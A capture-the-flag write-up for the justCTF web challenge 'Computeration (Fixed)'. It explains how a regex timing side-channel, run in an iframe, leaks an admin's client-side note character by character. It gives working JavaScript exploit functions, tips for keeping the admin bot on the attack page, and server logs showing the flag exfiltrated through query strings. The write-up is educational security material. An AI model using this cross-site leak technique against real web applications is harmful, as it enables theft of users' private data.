# Computeration (Fixed)  
**Catagory:** Web  
**Difficulty:** Hard  
>  Can you get admin's note? I heard the website runs only on client-side so
> should be secure...   https://computeration-fixed.web.jctf.pro/  
If you find anything interesting give me call here: https://computeration-
fixed.web.jctf.pro/report

>The flag is in the format: justCTF{[a-z_]+}.

**note**: I didn't solve this challenge during the CTF, but as a web-noob, I
wanted to create a writeup that was as bit more beginner friendly for my
fellow web-noobs.

## Recon: The Webapp  
Let's start by taking a look at the source of the webapp. There are a couple
things to note right out of the gate:  
1. The `x-frame-options` header is not set, so we can `iframe` the webapp to our hearts content. _(foreshadowing?)_  
2. Notes are indeed client-side, and reside in the session's localStorage:

```js  
let notes = JSON.parse(localStorage.getItem('notes')) || [];  
```

3. Neither note creation, nor rendering is properly sanitized, however this is not useful as there is no way to turn this into anything other than a self-XSS.

4. Searches are based on the current URL, and use regex under the hood.  
```js  
function searchNote(){  
   location.hash = searchNoteInp.value;  
}

// triggers when the hash _changes_. Note that the initial page load is not
considered a "hash change"  
onhashchange = () => {  
   // example.com#search_regex -> search_regex  
   const reg = new RegExp(decodeURIComponent(location.hash.slice(1)));  
   const found = [];  
   // Compare the contents of all notes to the provided regex,  
   // If they match, add their title to the "found" list  
   notes.forEach(e=>{  
       if(e.content.search(reg) !== -1){  
           found.push(e.title);  
       }  
   });  
   notesFound.innerHTML = found;  
}  
```

Being able to control the search by url will become important later, because
it allows us to interact with the webapp, even if we can only control the url.

## Recon: The Report Function  
Let's now focus on the second part of the challenge:  
> If you find anything interesting give me call here: https://computeration-
> fixed.web.jctf.pro/report

If we visit the report link, we are greeted by a form where we can input a url
for the admin to inspect. Let's first test if there are any restriction on the
report url.  
First, start a `nc` listener on a publicly reachable IP and port. Then submit
`http://[IP]:[Port]` to the admins form. Within a few seconds, the `nc`
terminal shows that the admin has connected to our server.  
Nice! this means that we can create our own malicious webpage and submit it
for review later.

## The Vulnerability  
The main vulnerability in the webapp is that we can make another user perform
a search on their private data, using a regex that we provide.  
  
This is an issue, because we can construct regexes that can take a long time
to complete, if and only if, they match a certain prefix. We can abuse this to
leak the flag char by char, based on how long it takes to perform a search.  
  
Here is an example of such a regex:  
```js  
// Prefix: "justCTF"  
// Guess : "a"  
let regex = "^(?=justCTF{a).*.*.*.*.*.*.*.*.*.*ABCDE";  
```  
If the flag does not start with "justCTF{a", the regex engine will quickly
return with no matches. However, if the flag does start with "justCTF{a", the
regex engine suddenly needs to evaluate an exponential number of ways to match
the flag with the ".\*"-chain.  

The final secret-sauce is the last part of the regex. Without it, the engine
can instantly return a match, since the flag matches `^justCTF{a.*`.

## Exploitation  
> Full exploit code is [available on
> github](https://github.com/RickdeJager/CTF/tree/master/JUSTCAT2020/web/computeration/code),
> this section will cover only the juicy parts.  

### The Game Plan  
1. Load an `iframe` that contains the webapp.  
1. Perform a regex search in the `iframe` to guess the next character of the flag.  
1. Queue another task and measure how long it takes to complete.  
1. If the task takes longer than expected, the regex engine must have slowed down our thread. This means our guess was correct.

Initially, I used an `async` function with a timeout to perform measurements.
However, this approach only works in the challenge server is single threaded.
Otherwise the measurement will simply be performed on another thread due to
"Site Isolation" (see [xsleaks](https://xsleaks.dev/docs/attacks/timing-
attacks/execution-timing/)).  
  
In a nutshell, **Chrome isolates javascript processes by their respective
domains**, so we need a way to create a task under the challenge servers
domain. To do this, we will just load a new `iframe` with
`src=https://computeration-fixed.web.jctf.pro/#` for each guess.

### Guessing The Next Character

The following two functions are used to guess a character. The `delta` and
`threshold` values, as well as the "difficulty formula" are chosen such that a
successful guess takes ~200ms, while a failure takes only a few ms at most.  

```js

function testChar(c) {  
 // Measure the initial time  
 var start = performance.now();

 // Perform a slow regex search in the iframe  
 // The number of ".*"'s goes up as we learn more of the flag, to keep the  
 // regex sufficiently difficult.  
 var dif = 6 + Math.floor(Math.log(known.length) / 2);  
 var regex = "^(?="+known+c+")"+ ".*".repeat(dif) +"ABCDE$";  
 ifr.src = url+encodeURIComponent(regex);  
 // Sleep for a few ms, to ensure the regex engine is churning when we load
the second iframe  
 await sleep(delta);

 // Setup a measurement by creating a new iframe on the challenge domain.  
 var ifr2 = document.createElement('iframe');  
 ifr2.src = url;  
 ifr2.onload = measure(start, c);  
 document.body.appendChild(ifr2);  
}

async function measure(start, c) {  
 var time = performance.now() - start - delta;  
 console.log("[%s: %d ms] %s", c, time, known);

 // This took longer than usual, indicating regex-bullshittery  
 if (time > threshold) {  
   // Update the "known" variable with the new character  
   known = known + c;  
   // Add the current flag to the url so we can see it in our server logs  
   window.location = window.location.origin + window.location.pathname + "?" +
known;  
 }  
}

```

This code is easily turned into a bruteforcer by looping over the entire
alphabet and testing each character. Note that you must also exfiltrate the
flag somehow. I chose to save it in the query string, which shows up in most
webserver logs.

### Hosting the exploit  
To host this exploit, create a simple webpage that loads the exploit script.
This webpage must never finish loading, since the bot will leave our site when
it does. This can be fixed by adding an image that loads slowly.  
```html  
![](https://deelay.me/10000/http://example.com)  
```

Now we are ready to actually host our exploit, which we can do with pythons
webserver for example. Next, we send the admin a link to our hosted page.
Within a few seconds, the admin connects and we start to receive parts of the
flag.  

The admins connection will timeout at some point, so it is important that the
exploit code reads the partial flag from the query string such that it can
resume. Using the above code you can leak about two or three characters per
attempt.  
```  
ctf@ctf-vps:~/justCAT$ python3 -m http.server 1337  
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...  
[...]  
206.189.107.148 - - [05/Feb/2021 16:56:24] "GET /hack.html?justCTF{no_refere
HTTP/1.1" 200 -  
206.189.107.148 - - [05/Feb/2021 16:56:32] "GET /hack.html?justCTF{no_referer
HTTP/1.1" 200 -  
206.189.107.148 - - [05/Feb/2021 16:56:35] "GET /hack.html?justCTF{no_referer_
HTTP/1.1" 200 -  
[...]  
206.189.107.148 - - [05/Feb/2021 16:58:03] "GET
/hack.html?justCTF{no_referer_typo_ehhhhhh HTTP/1.1" 200 -  
206.189.107.148 - - [05/Feb/2021 16:58:07] "GET
/hack.html?justCTF{no_referer_typo_ehhhhhh} HTTP/1.1" 200 -  
```

```  
flag: justCTF{no_referer_typo_ehhhhhh}  
```

## Demo  
The victims chrome session can be seen in the top half of the screen. The
bottom half of the screen shows the requests received by our PHP server. The
flag is slowly extracted over the course of a few minutes.

![](https://raw.githubusercontent.com/RickdeJager/CTF/master/JUSTCAT2020/web/computeration/res/demo.gif)

## Acknowledgement and Links  
I wrote this writeup after the CTF was over, mainly to gain a better
understanding of web challenges. I started by reading the [writeup written by
the challenge author](https://ctftime.org/writeup/25869), which also contains
a lot of links to other great resources.  

Original writeup
(https://github.com/RickdeJager/CTF/blob/master/JUSTCAT2020/web/computeration/writeup.md).